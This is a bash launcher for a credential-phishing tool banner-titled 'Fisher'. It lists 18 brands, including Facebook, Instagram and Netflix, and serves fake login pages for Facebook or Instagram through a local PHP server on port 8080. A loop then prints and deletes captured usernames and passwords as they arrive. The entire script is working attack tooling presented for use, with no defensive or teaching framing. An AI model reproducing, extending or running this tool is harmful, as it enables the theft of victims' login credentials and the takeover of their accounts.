#!/bin/bash

#Giving Colors
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')" 
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')" PURPLE="$(printf '\033[35m')"  BPURPLE="$(printf '\033[1;31m')"
RESETBG="$(printf '\e[0m\n')"


#Installing php
sudo apt-get install -y php
clear

#logo/banner
echo "
"$(printf '\033[1;31m')"$RED _____ _     _               
$RED|  ___(_)___| |__   ___ _ __ 
$BLUE| |_  | / __| '_ \ / _ \ '__|
$CYAN|  _| | \__ \ | | |  __/ |   
$WHITE|_|   |_|___/_| |_|\___|_|  
" 





#website options(what will be displayed)
echo "
$BLUE[${WHITE}01${BLUE}]$CYAN Facebook
$BLUE[${WHITE}02${BLUE}]$CYAN Instagram
$BLUE[${WHITE}03${BLUE}]$CYAN Twitter
$BLUE[${WHITE}04${BLUE}]$CYAN Netflix
$BLUE[${WHITE}05${BLUE}]$CYAN PlayStation
$BLUE[${WHITE}06${BLUE}]$CYAN Twitch
$BLUE[${WHITE}07${BLUE}]$CYAN SnapChat
$BLUE[${WHITE}08${BLUE}]$CYAN pinterest
$BLUE[${WHITE}09${BLUE}]$CYAN Spotify
$BLUE[${WHITE}10${BLUE}]$CYAN Reddit
$BLUE[${WHITE}11${BLUE}]$CYAN Adobe
$BLUE[${WHITE}12${BLUE}]$CYAN Yahoo
$BLUE[${WHITE}13${BLUE}]$CYAN Word Press
$BLUE[${WHITE}14${BLUE}]$CYAN Yandex
$BLUE[${WHITE}15${BLUE}]$CYAN Xbox
$BLUE[${WHITE}16${BLUE}]$CYAN Github
$BLUE[${WHITE}17${BLUE}]$CYAN Quora
$BLUE[${WHITE}18${BLUE}]$CYAN LinkedIn"

reset_text_type="$(printf '\033[0m')" 

echo $reset_text_type""

#host and port
HOST='127.0.0.1'
PORT='8080'

#getting input from user
read -p $GREEN"
Enter your target website: " target_website

#telling the tool what to do when the user inputs a particlar number
if [ $target_website = 1 ]
then
cd Websites/Facebook/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
elif [ $target_website = 2 ]
then
cd Websites/Instagram && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
else
echo "Other websites are in progress, please check the 'update.sh' file to check for updates..."
fi


#if [ $target_website == 1 ]
#then 
# cd Websites/Facebook/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
#elif [ $target_website == 2 ]
#then
# cd Websites/Instagram/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
#fi
#clear



echo $RED"Successfully hosted at:$GREEN http://127.0.0.1:8080"

echo $BLUE"
Press Ctrl + C to exit"$RESETBG
#tail -f ./Websites/Facebook/usernames.txt
while true; do

if [ -e "./Websites/Facebook/usernames.txt" ];then
clear
echo $ORANGE"
Username and Password is captured"
echo $CYAN""
cat ./Websites/Facebook/usernames.txt
rm ./Websites/Facebook/usernames.txt ;
echo $RESETBG""
elif [ -e "./Websites/Instagram/usernames.txt" ];then
echo $ORANGE"
Username and Password is captured"
echo $CYAN""
cat ./Websites/Instagram/usernames.txt
rm ./Websites/Instagram/usernames.txt ;
echo $RESETBG""
fi
sleep 1;
done

